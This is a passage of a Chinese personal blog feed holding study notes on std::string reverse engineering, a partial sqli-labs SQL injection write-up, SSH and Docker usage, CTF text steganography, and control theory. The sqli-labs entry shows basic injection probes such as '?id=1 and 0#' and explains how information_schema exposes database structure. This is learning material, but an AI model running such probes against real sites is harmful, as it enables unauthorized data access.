<p>当没有空基类优化时，可能的空间分布为：</p>
<figure>
<img src="/std-string-note/image-20220816140019397.png" alt="image-20220816140019397">
<figcaption aria-hidden="true">image-20220816140019397</figcaption>
</figure>
<h2 id="特征">特征</h2>
<p>实际上类在 C++
中是一种语法糖的表现形式，在底层编译时会被分离为结构体和函数（大概率是内联函数）的形式，一个较为明显的特征点是由于
<code>std::string</code> 的小字符串优化，于是会存在取真实值的时候会进行
<code>std::string.nMaxSize &gt;= 16</code> 的比较。</p>
<p>例如以下这种判断形式：</p>
<figure>
<img src="/std-string-note/image-20220816140602051.png" alt="image-20220816140602051">
<figcaption aria-hidden="true">image-20220816140602051</figcaption>
</figure>
<p>将其更改得更为明显一些（更改变量类型）：</p>
<figure>
<img src="/std-string-note/image-20220816141533896.png" alt="image-20220816141533896">
<figcaption aria-hidden="true">image-20220816141533896</figcaption>
</figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>re</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs注入笔记</title>
    <url>//sqli-labs-note.html</url>
    <content><![CDATA[<blockquote>
<p>暂时还在更新，博主比较懒，请提醒它及时完成 sqli-labs</p>
</blockquote>
<h1 id="前言">前言</h1>
<p>SQL 注入的产生有三个要素：</p>
<ol type="1">
<li>未严格校验 SQL 语句</li>
<li>恶意修改 SQL 语句</li>
<li>成功执行</li>
</ol>
<p>一般来说我们进行 SQL 注入有以下步骤：</p>
<ol type="1">
<li>判断是否有注入（第一要素：是否严格校验）</li>
<li>判断是什么类型的注入</li>
<li>语句是否能够被恶意修改（第二要素：恶意修改）</li>
<li>是否能够成功执行（第三要素：成功执行）</li>
<li>获取我们想要的数据</li>
</ol>
<h2 id="判断是否有注入">判断是否有注入</h2>
<ol type="1">
<li>可控参数的改变是否能够影响页面显示结果</li>
<li>输入的 SQL
语句是否能报错，能通过数据库的报错，看到数据库的一些语句的痕迹</li>
<li>输入的 SQL 语句是否不报错，判断我们的语句是否能闭合</li>
</ol>
<h2 id="mysql">MySQL</h2>
<p>在 MySQL 中，会默认存在两个库 <code>mysql</code> 和
<code>information_schema</code>。</p>
<p>其中 <code>information_schema</code> 这个库保存着 MySQL
的所有信息，重要的是，<code>information_schema</code>
包含以下几个重要的表：</p>
<ul>
<li><code>SCHEMATA</code> → 包含所有
<code>SCHEMA_NAME</code>，即所有的库名，包括本身</li>
<li><code>TABLES</code> → 包含所有
<code>TABLE_NAME</code>，即所有的表名，包括本身</li>
<li><code>COLUMNS</code> → 包含所有的
<code>COLUMN_NAME</code>，即所有的字段名，包括本身</li>
</ul>
<p><code>COLUMNS</code> 表里有着几个重要的字段名：</p>
<ul>
<li><code>TABLE_SCHEMA</code> → 库名</li>
<li><code>TABLE_NAME</code> → 表名</li>
<li><code>COLUMN</code> → 字段名</li>
</ul>
<h1 id="basic-challenges">Basic Challenges</h1>
<h2 id="less-1">Less-1</h2>
<h2 id="less-2-intiger">Less-2 Intiger</h2>
<p>尝试改变 payload <code>?id=3</code>，发现页面发生改变；</p>
<p>尝试添加单引号和双引号，引发报错：</p>
<figure>
<img src="/sqli-labs-note/image-20220807222546950.png" alt="image-20220807222546950">
<figcaption aria-hidden="true">image-20220807222546950</figcaption>
</figure>
<p>不妨猜测 SQL 语句可能是
<code>where id=3 LIMIT 0,1</code>，那么尝试添加注释符，使得语句不报错；</p>
<p>payload 为 <code>?id=1#</code> 时，SQL
不报错，故为<strong>整形注入</strong>；</p>
<p>输入 payload <code>?id=1 and 0#</code>
发现可以<strong>恶意修改</strong>；</p>
<h2 id="less-1-1">Less-1</h2>
<h2 id="less-1-2">Less-1</h2>
<h2 id="less-1-3">Less-1</h2>
<h2 id="less-1-4">Less-1</h2>
<h2 id="less-1-5">Less-1</h2>
<h2 id="less-1-6">Less-1</h2>
<h2 id="less-1-7">Less-1</h2>
<h2 id="less-1-8">Less-1</h2>
<h2 id="less-1-9">Less-1</h2>
<h2 id="less-1-10">Less-1</h2>
<h2 id="less-1-11">Less-1</h2>
<h2 id="less-1-12">Less-1</h2>
<h2 id="less-1-13">Less-1</h2>
<h2 id="less-1-14">Less-1</h2>
<h2 id="less-1-15">Less-1</h2>
<h2 id="less-1-16">Less-1</h2>
<h2 id="less-1-17">Less-1</h2>
<h2 id="less-1-18">Less-1</h2>
<h2 id="less-1-19">Less-1</h2>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh的使用笔记</title>
    <url>//ssh-note.html</url>
    <content><![CDATA[<h1 id="ssh使用详解">ssh使用详解</h1>
<h2 id="ssh">ssh</h2>
<table>
<colgroup>
<col style="width: 25%">
<col style="width: 75%">
</colgroup>
<thead>
<tr class="header">
<th>-b bind_address</th>
<th>在本地主机上绑定用于ssh连接的地址，当系统有多个ip时才生效。</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>-E log_file</strong></td>
<td><strong>将debug日志写入到log_file中，而不是默认的标准错误输出stderr。</strong></td>
</tr>
<tr class="even">
<td><strong>-F configfile</strong></td>
<td><strong>指定用户配置文件，默认为~/.ssh/config。</strong></td>
</tr>
<tr class="odd">
<td><strong>-f</strong></td>
<td><strong>请求ssh在工作在后台模式。该选项隐含了"-n"选项，所以标准输入将变为/dev/null。</strong></td>
</tr>
<tr class="even">
<td><strong>-i identity_file</strong></td>
<td><strong>指定公钥认证时要读取的私钥文件。默认为id_rsa。</strong></td>
</tr>
<tr class="odd">
<td><strong>-l login_name</strong></td>
<td><strong>指定登录在远程机器上的用户名。也可以在全局配置文件中设置。</strong></td>
</tr>
<tr class="even">
<td><strong>-N</strong></td>
<td><strong>显式指明ssh不执行远程命令。一般用于端口转发，见后文端口转发的示例分析。</strong></td>
</tr>
<tr class="odd">
<td><strong>-n</strong></td>
<td><strong>将/dev/null作为标准输入stdin，可以防止从标准输入中读取内容。ssh在后台运行时默认该项。</strong></td>
</tr>
<tr class="even">
<td><strong>-p port</strong></td>
<td><strong>指定目的端口，默认为22。</strong></td>
</tr>
<tr class="odd">
<td><strong>-q</strong></td>
<td><strong>静默模式。大多数警告信息将不输出。</strong></td>
</tr>
<tr class="even">
<td><strong>-T</strong></td>
<td><strong>禁止为ssh分配伪终端。</strong></td>
</tr>
<tr class="odd">
<td><strong>-t</strong></td>
<td><strong>强制分配伪终端，重复使用该选项"-tt"将进一步强制。</strong></td>
</tr>
<tr class="even">
<td><strong>-v</strong></td>
<td><strong>详细模式，将输出debug消息，可用于调试。"-vvv"可更详细。</strong></td>
</tr>
<tr class="odd">
<td><strong>-V</strong></td>
<td><strong>显示版本号并退出。</strong></td>
</tr>
<tr class="even">
<td><strong>-o</strong></td>
<td><strong>指定额外选项，选项非常多。</strong></td>
</tr>
<tr class="odd">
<td><strong>user@host</strong></td>
<td><strong>指定登录远端主机的用户名。</strong></td>
</tr>
<tr class="even">
<td><strong>host</strong></td>
<td><strong>如果本机用户名和需要登录的远端用户名一致，可省略用户名。</strong></td>
</tr>
</tbody>
</table>
<h3 id="基本示例">基本示例</h3>
<p>以172.16.10.6主机上的longshuai用户登录172.16.10.6</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh longshuai@172.16.10.6</span><br></pre></td></tr></table></figure>
<p>使用ssh还可以实现主机跳转，即跳板功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh 172.16.10.6</span><br></pre></td></tr></table></figure>
<h2 id="ssh-keygen">ssh-keygen</h2>
<table>
<colgroup>
<col style="width: 20%">
<col style="width: 80%">
</colgroup>
<thead>
<tr class="header">
<th><strong>-b length</strong></th>
<th><strong>指定密钥长度</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>-e file</strong></td>
<td><strong>读取openssh的私钥或者公钥文件</strong></td>
</tr>
<tr class="even">
<td><strong>-C comment</strong></td>
<td><strong>添加注释</strong></td>
</tr>
<tr class="odd">
<td><strong>-f filename</strong></td>
<td><strong>指定用来保存密钥的文件名</strong></td>
</tr>
<tr class="even">
<td><strong>-i file</strong></td>
<td><strong>读取未加密的ssh-v2兼容的私钥/公钥文件，然后在标准输出设备上显示openssh兼容的私钥/公钥</strong></td>
</tr>
<tr class="odd">
<td><strong>-I file</strong></td>
<td><strong>显示公钥文件的指纹数据</strong></td>
</tr>
<tr class="even">
<td><strong>-N key</strong></td>
<td><strong>提供一个新密语</strong></td>
</tr>
<tr class="odd">
<td><strong>-P key</strong></td>
<td><strong>提供（旧）密语</strong></td>
</tr>
<tr class="even">
<td><strong>-q</strong></td>
<td><strong>静默模式</strong></td>
</tr>
<tr class="odd">
<td><strong>-t type</strong></td>
<td><strong>指定要创建的密钥类型</strong></td>
</tr>
</tbody>
</table>
<p>默认在<strong>~/.ssh</strong>目录下生成<strong>id_rsa</strong>和<strong>id_rsa.pub</strong>文件</p>
<table>
<colgroup>
<col style="width: 20%">
<col style="width: 80%">
</colgroup>
<thead>
<tr class="header">
<th><strong>id_rsa</strong></th>
<th><strong>私钥文件</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>id_rsa.pub</strong></td>
<td><strong>公钥文件</strong></td>
</tr>
<tr class="even">
<td><strong>known_hosts</strong></td>
<td><strong>类似hosts文件，用于保存访问过的计算机的公钥，OpenSSH会自动进行核对</strong></td>
</tr>
</tbody>
</table>
<p>多个<strong>SSH key</strong>的管理的情况需要指定秘钥文件名。</p>
<h3 id="基本示例-1">基本示例</h3>
<p>默认在 <code>~/.ssh</code> 目录中生成<strong>SSH
RSA</strong>公钥和私钥文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>默认在 <code>~/.ssh</code>目录中生成4096位<strong>SSH
RSA</strong>公钥和私钥文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -m PEM -t rsa -b 4096</span><br></pre></td></tr></table></figure>
<h1 id="dockerssh">Docker&amp;ssh</h1>
<p>加入一行：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y openssh-server &amp;&amp; service ssh start</span></span><br></pre></td></tr></table></figure>
<p>同时暴露端口：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPOSE</span> <span class="number">22</span></span><br></pre></td></tr></table></figure>
<p>随后开启 sshd 服务：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> /usr/sbin/sshd -D</span></span><br></pre></td></tr></table></figure>
<p>如果不想使用默认端口，需要更改配置文件
<code>/etc/ssh/sshd_config</code>，在其中添加一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Port 22</span><br></pre></td></tr></table></figure>
<p>其中 <code>22</code> 是端口号。</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>文本隐写笔记</title>
    <url>//text-forensics-note.html</url>
    <content><![CDATA[<h1 id="base64-隐写">Base64 隐写</h1>
<ul>
<li><p>当存在 <code>=</code> 的时候，最后一个非 <code>=</code>
字符将会有两位与解码无关</p>
<figure>
<img src="/text-forensics-note/base64隐写=.jpg" alt="base64隐写=">
<figcaption aria-hidden="true">base64隐写=</figcaption>
</figure></li>
<li><p>当存在 <code>==</code> 的时候，最后一个非 <code>=</code>
字符将会有四位与解码无关</p>
<figure>
<img src="/text-forensics-note/base64隐写==.jpg" alt="base64隐写==">
<figcaption aria-hidden="true">base64隐写==</figcaption>
</figure></li>
</ul>
<p>故例如 <code>aGU=</code> 和 <code>aGW=</code>
的解码结果是一样的，但我们可以在里面隐藏两位数据；<code>aA==</code> 和
<code>aK==</code> 的解码结果是一样的，但我们可以在里面隐藏四位数据。</p>
<p>故有以下隐写和提取代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">bases: typing.<span class="type">Sequence</span>[<span class="built_in">str</span>], needBin: <span class="built_in">bool</span>=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        base64隐写提取函数</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; BASE64.extract([&#x27;VEhJUz==&#x27;, &#x27;RkxBR3==&#x27;, &#x27;SVN=&#x27;, &#x27;SElEREVOLo==&#x27;, &#x27;Q0FO&#x27;, &#x27;WU9V&#x27;, &#x27;RklORM==&#x27;, &#x27;SVT=&#x27;, &#x27;T1VUP4==&#x27;])</span></span><br><span class="line"><span class="string">        &#x27;7c8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Parameters:</span></span><br><span class="line"><span class="string">            bases - base64数组</span></span><br><span class="line"><span class="string">            needBin - 是否直接返回所提取的二进制数据</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            提取出的数据</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">        code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> base <span class="keyword">in</span> bases:</span><br><span class="line">            <span class="keyword">if</span> base.endswith(<span class="string">&#x27;==&#x27;</span>):</span><br><span class="line">                c = base[-<span class="number">3</span>]</span><br><span class="line">                code += <span class="built_in">bin</span>(table.find(c) &amp; <span class="number">0xF</span>)[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">elif</span> base.endswith(<span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">                c = base[-<span class="number">2</span>]</span><br><span class="line">                code += <span class="built_in">bin</span>(table.find(c) &amp; <span class="number">0x3</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> needBin:</span><br><span class="line">            <span class="keyword">return</span> code</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(code) &lt; <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">raise</span> <span class="string">&quot;所提取出来的数据不足8位！&quot;</span></span><br><span class="line">        msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">8</span>):</span><br><span class="line">            msg += <span class="built_in">chr</span>(<span class="built_in">int</span>(code[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">bases: typing.<span class="type">Sequence</span>[<span class="built_in">str</span>], data: <span class="built_in">bytes</span></span>):</span><br><span class="line">        table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">        msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        result = []</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            msg += <span class="string">&quot;&#123;:08b&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        <span class="keyword">for</span> base <span class="keyword">in</span> bases:</span><br><span class="line">            <span class="keyword">if</span> base.endswith(<span class="string">&#x27;==&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(msg) &lt; <span class="number">4</span>:</span><br><span class="line">                    msg += <span class="string">&#x27;0&#x27;</span> * (<span class="number">4</span> - <span class="built_in">len</span>(msg))</span><br><span class="line">                data, msg = msg[:<span class="number">4</span>], msg[<span class="number">4</span>:]</span><br><span class="line">                base = <span class="built_in">list</span>(base)</span><br><span class="line">                base[-<span class="number">3</span>] = table[table.find(base[-<span class="number">3</span>]) &amp; <span class="number">0xF0</span> | <span class="built_in">int</span>(data, <span class="number">2</span>)]</span><br><span class="line">            <span class="keyword">elif</span> base.endswith(<span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(msg) &lt; <span class="number">2</span>:</span><br><span class="line">                    msg += <span class="string">&#x27;0&#x27;</span> * (<span class="number">2</span> - <span class="built_in">len</span>(msg))</span><br><span class="line">                data, msg = msg[:<span class="number">2</span>], msg[<span class="number">2</span>:]</span><br><span class="line">                base = <span class="built_in">list</span>(base)</span><br><span class="line">                base[-<span class="number">2</span>] = table[table.find(base[-<span class="number">2</span>]) &amp; <span class="number">0b11111100</span> | <span class="built_in">int</span>(data, <span class="number">2</span>)]</span><br><span class="line">            result.append(<span class="string">&#x27;&#x27;</span>.join(base))</span><br><span class="line">        <span class="keyword">return</span> result, <span class="built_in">len</span>(msg)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="brainfuck">Brainfuck</h1>
<p>Brainfuck 是一款极简的深奥语言（eco-language），特征是它由
<code>&gt; &lt; + - . , [ ]</code> 八种符号组成代码，并且开头可能会出现
<code>+++++ +++++[</code> 的代码。</p>
<p>需要注意的是对于不同长度的明文，可能会出现不同的头。如果代码头不存在时，需要自己尝试添加
<code>+</code> 爆破。</p>
<h1 id="emoji-加密">emoji 加密</h1>
<p>有关 emoji 表情的加密有很多，需要一个一个尝试。</p>
<ul>
<li>Base100</li>
<li><a href="https://aghorler.github.io/emoji-aes/">emoji-aes</a></li>
<li><a href="https://foundation.mozilla.org/en/campaigns/codemoji/?utm_source=codemoji.org&amp;utm_content=redirect">Codemoji</a>
与<a href="https://github.com/pavelvodrazka/ctf-writeups/tree/master/hackyeaster2018/challenges/egg17/files/cracker">暴力破解工具</a></li>
<li><a href="http://www.atoolbox.net/Tool.php?Id=937">奇怪工具箱的 Emoji
加密</a></li>
</ul>
<h1 id="ocr">OCR</h1>
<p>有的时候图片所包含的文本太长，手读困难且短时间内无法快速识别，我们就需要使用到
OCR（光学字符识别），可以帮我们有效提高时间效率。</p>
<p>但需要注意的是，OCR
往往只对印刷体和计算机字体有较高的识别率，但对手写体等可能并不能很好的识别，所以最好需要进行检查和纠错。</p>
<p>可以使用 <a href="https://ocr.wdku.net/">https://ocr.wdku.net/</a>
进行识别，免费支持精确的文字识别（相对来说误差率会更低一些）。</p>
<h1 id="pyc-隐写">PYC 隐写</h1>
<p>PYC
隐写即剑龙隐写（Stegosaurus），因为该软件的名字翻译过来就是剑龙。</p>
<p>在 <a href="https://github.com/AngelKitty/stegosaurus">https://github.com/AngelKitty/stegosaurus</a>
可以直接安装使用此软件。（建议直接使用 Release 版本）</p>
<p>内有 Python 脚本和编译好的 Linux 软件，按个人喜好使用。</p>
<p>使用方式为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./stegosaurus -x xxx.pyc</span><br></pre></td></tr></table></figure>
<h1 id="snow-隐写">SNOW 隐写</h1>
<p>SNOW 是 the Steganographic Nature Of Whitespace 的简写。</p>
<p>SNOW 用于通过在行尾附加空格和制表符来隐藏 ASCII
文本中的消息，所以当看到大量非同寻常的空格或者制表符时，可以考虑是 SNOW
隐写。</p>
<p>同时 SNOW 隐写主要运用在 HTML 文件（网页）中，所以 SNOW 隐写又被称为
HTML 隐写。</p>
<p>使用以下指令提取消息：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">SNOW.EXE <span class="literal">-C</span> <span class="literal">-p</span> password infile outfile</span><br></pre></td></tr></table></figure>
<p>其中 <code>-p</code> 后面跟着密码字符串，可以包含空格等字符 (例如
<code>-p 'Hello Wolrd'</code>)。</p>
<p>需要注意的是，<code>infile</code> 必须在 <code>outfile</code>
前，如果不填 <code>infile</code> 选项，则默认从标准输入中获得；如果不填
<code>outfile</code> 选项，则默认输出到标准输出中。</p>
<p>更多信息可以参考<a href="/snow-note">本博客</a>。</p>
<h1 id="twitter-secret-messages-半角全角字符隐写">Twitter Secret
Messages (半角全角字符隐写)</h1>
<p>一开始是作为隐藏推特文章的一个文本隐写手段，它会将半角字母转换为全角字母（Unicode
同形字母），特点就是一段话会看起来十分的奇怪：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Woｗ！! What a ｗｏｎdeｒｆul ｄaｙ ！！! І ｗｉsｈ I cｏulｄ eхtenｄ thｉｓ dａｙ as</span><br><span class="line">ｍｕｃh ａs pｏｓｓｉbｌe．..</span><br></pre></td></tr></table></figure>
<figure>
<img src="/text-forensics-note/tsm隐写结果.png" alt="tsm隐写结果">
<figcaption aria-hidden="true">tsm隐写结果</figcaption>
</figure>
<p>我们可以使用<a href="https://holloway.nz/steg/">在线加解密网站</a>对这样的字符串进行解密，只需将对应的字符串粘贴在
Decode 区域中的 Tweet 文本框中即可：</p>
<figure>
<img src="/text-forensics-note/tsm解密结果.png" alt="tsm解密结果">
<figcaption aria-hidden="true">tsm解密结果</figcaption>
</figure>
<h1 id="vigenere">Vigenere</h1>
<p>维吉尼亚的词频分析求解十分常见，这里仅给出在线求解网站，各种网站在分析性能上无孰优孰劣之分。</p>
<ul>
<li>https://www.guballa.de/vigenere-solver</li>
<li>https://quipqiup.com/</li>
<li>https://www.dcode.fr/chiffre-vigenere</li>
</ul>
<h1 id="whitespace">Whitespace</h1>
<p>WhiteSpace
是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统会被当做注释对待。</p>
<p>特点就是可以看到大量的空格和TAB相连的情况，具体可以参考<a href="/whitespace-note.html">此博客</a>。</p>
<p>我们可以使用 <a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a>
进行运行和编辑 WhiteSpace 程序。</p>
<h1 id="wbstego">wbStego</h1>
<p>wbStego 支持 TXT，HTML，XML 和 PDF 文件。</p>
<p>HTML，TXT，XML 的隐写会出现大量空白字符，类似 SNOW 隐写。</p>
<p>PDF 的隐写会出现未知流 <code>&lt;stream&gt;</code>。</p>
<h1 id="word-隐藏文字">Word 隐藏文字</h1>
<p>Word 有许多排版方式，其中有一种字体效果是<strong>隐藏</strong>。</p>
<p>对于这种情况可以直接使用 ctrl + A
快捷键选取所有文本，然后右键选择<strong>字体</strong>，再将<strong>隐藏</strong>效果关闭。</p>
<p><img src="/text-forensics-note/Word 隐藏字体.png" alt="Word 隐藏字体" style="zoom:60%;"></p>
<p>同时如果想要准确判断是否存在隐藏文字，可以点击<strong>文件-信息-检查文档</strong>。</p>
<p>这个功能可以检查是否存在因为设置导致的不可见对象或者隐藏文字。</p>
<h1 id="zero-width-隐写0宽字符隐写">Zero-Width 隐写（0宽字符隐写）</h1>
<p>零宽度字符是一些<strong>不可见的，不可打印的</strong>字符。它们存在于页面中主要用于<strong>调整字符的显示格式</strong>。</p>
<p>使用 vim 可以直接查看到这些特殊的 0 宽字符，例如</p>
<figure>
<img src="/text-forensics-note/特别的0宽字符.png" alt="特别的0宽字符">
<figcaption aria-hidden="true">特别的0宽字符</figcaption>
</figure>
<p>可以使用<a href="http://330k.github.io/misc_tools/unicode_steganography.html">在线加解密网站</a>对0宽字符隐写进行解密。</p>
<p>将加密文本放在右侧，点击 <code>Decode</code>
即可将文本和加密信息分离：</p>
<figure>
<img src="/text-forensics-note/zero-width隐写解密.png" alt="zero-width隐写解密">
<figcaption aria-hidden="true">zero-width隐写解密</figcaption>
</figure>
<p>该网站可以自由选择加解密参数，通常只用选择文本中存在的零宽字符。但缺点是该网站对零宽字符的支持过少。</p>
<p>还可以使用网站：<a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a></p>
<p>该网站的优势是支持所有的零宽字符解密，但缺点是无法自由选择你想要的零宽字符。</p>
<h1 id="词频隐写">词频隐写</h1>
<p>将关键信息转换成冗余字符后打乱顺序，用词频顺序进行解密，一般来说会利用
Python 的 <code>collections.Counter</code>
进行词频统计，一个简单的题解可能是这样的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">c = Counter(data)</span><br><span class="line">k = c.most_common()</span><br><span class="line">k = <span class="string">&#x27;&#x27;</span>.join(i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> k)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br></pre></td></tr></table></figure>
<h1 id="流量分析">流量分析</h1>
<h2 id="ping-流量包">Ping 流量包</h2>
<p>Ping 流量可以夹杂有效数据。</p>
<p>正常的 Ping
包应该带有的是有序的填充数据，而非无序的（相对而言）。</p>
<h2 id="错误的-tcp-包">错误的 TCP 包</h2>
<p>错误的 TCP 包可以夹杂有效数据（或者是其他未被使用的 TCP
包），因为一个有效流量包中的 TCP 包不应该出现大规模丢包、错包。</p>
<blockquote>
<p>Wireshark 标记为黑色。</p>
</blockquote>
<p>例如可以通过发送 Sequence Number 不对的 TCP 包，通过 Sequence Number
来传输数据，此时会出现同一个端口发送了大量错包，导致 Wireshark 识别 TCP
的 Sequence Number 顺序不对。</p>
<h1 id="空白字符隐写">空白字符隐写</h1>
<p>利用空白字符进行隐写的手段很多，目前已经见过的有：</p>
<ul>
<li>制表符代表摩斯电码中的长码
(<code>-</code>)，空格代表摩斯电码中的短码 (<code>.</code>)</li>
<li>长空白代表二进制中的 1，短空白代表莫斯电码中的 0</li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>forensics</tag>
      </tags>
  </entry>
  <entry>
    <title>自动控制原理-线性系统的时域分析与校正</title>
    <url>//time-domain-analysis-and-correction.html</url>
    <content><![CDATA[<h1 id="自动控制原理">自动控制原理</h1>
<h2 id="线性系统的时域性能指标">线性系统的时域性能指标</h2>
<h3 id="时域分析法中的典型输入信号">时域分析法中的典型输入信号</h3>
<figure>
<img src="/time-domain-analysis-and-correction/时域分析法中的典型输入信号.png" alt="时域分析法中的典型输入信号">
<figcaption aria-hidden="true">时域分析法中的典型输入信号</figcaption>
</figure>
<h3 id="动态性能">动态性能</h3>
<p>系统的动态性能是以<strong>系统阶跃响应</strong>为基础来衡量的。</p>
<table>
<colgroup>
<col style="width: 12%">
<col style="width: 43%">
<col style="width: 43%">
</colgroup>
<thead>
<tr class="header">
<th>动态性能指标</th>
<th>含义</th>
<th>图示</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>延迟时间 <span class="math inline">\(t_d\)</span></td>
<td>阶跃响应第一次达到终值 <span class="math inline">\(h(\infty)\)</span> 的 <span class="math inline">\(50\%\)</span> 所需的时间</td>
<td><img src="/time-domain-analysis-and-correction/延迟时间图示.png" alt="延迟时间图示"></td>
</tr>
<tr class="even">
<td>上升时间 <span class="math inline">\(t_r\)</span></td>
<td>阶跃响应从终值的 <span class="math inline">\(10\%\)</span>
上升到终值的 <span class="math inline">\(90\%\)</span>
所需的时间；对有振荡的系统，也可以定义为从 0
到第一次达到终值所需的时间</td>
<td><img src="/time-domain-analysis-and-correction/上升时间图示.png" alt="上升时间图示"></td>
</tr>
<tr class="odd">
<td>峰值时间 <span class="math inline">\(t_p\)</span></td>
<td>阶跃响应越过终值 <span class="math inline">\(h(\infty)\)</span>
达到第一个峰值所需的时间</td>
<td><img src="/time-domain-analysis-and-correction/峰值时间图示.png" alt="峰值时间图示"></td>
</tr>
<tr class="even">
<td>调节时间 <span class="math inline">\(t_s\)</span></td>
<td>阶跃响应到达并保持在终值 <span class="math inline">\(h(\infty)\)</span> 的 <span class="math inline">\(\pm5\%\)</span>
<strong>误差带</strong>内所需的最短时间；有时也用终值的 <span class="math inline">\(\pm2\%\)</span>
<strong>误差带</strong>来定义调节时间</td>
<td><img src="/time-domain-analysis-and-correction/调节时间图示.png" alt="调节时间图示"></td>
</tr>
<tr class="odd">
<td>超调量 <span class="math inline">\(\sigma\%\)</span></td>
<td>峰值 <span class="math inline">\(h(t_p)\)</span> 超出终值 <span class="math inline">\(h(\infty)\)</span> 的百分比</td>
<td><img src="/time-domain-analysis-and-correction/超调量图示.png" alt="超调量图示"></td>
</tr>
</tbody>
</table>
<figure>
<img src="/time-domain-analysis-and-correction/系统的典型阶跃响应及动态性能指标.png" alt="系统的典型阶跃响应及动态性能指标">
<figcaption aria-hidden="true">系统的典型阶跃响应及动态性能指标</figcaption>
</figure>
<h2 id="一阶系统时间响应及动态性能">一阶系统时间响应及动态性能</h2>
<h3 id="传递函数标准型">传递函数标准型</h3>
<p>开环传递函数 <span class="math display">\[
G(s)=\frac{K}{s}
\]</span> 闭环传递函数 <span class="math display">\[
\Phi(s)=\frac{\frac{K}{s}}{1+\frac{K}{s}}=\frac{1}{Ts+1},T=\frac{1}{K}
\]</span> 单位阶跃响应 <span class="math display">\[
C(s)=\Phi(s)R(s)=\frac{1}{Ts+1}\frac{1}{s}=\frac{1}{s}-\frac{1}{s+1/T}
\]</span> 时域下的单位阶跃响应 <span class="math display">\[
h(t)=\mathscr{L}^{-1}[C(s)]=1-e^{-\frac{t}{T}}
\]</span> 其中，<span class="math inline">\(K\)</span>
称作<strong>开环增益</strong>，<span class="math inline">\(T\)</span>
称作一阶系统的<strong>时间常数</strong>，系统特征根 <span class="math inline">\(\lambda=-1/T=-K\)</span>。</p>
<h3 id="动态性能指标计算">动态性能指标计算</h3>
<p>通过时域下单位阶跃响应的表达式，可知</p>
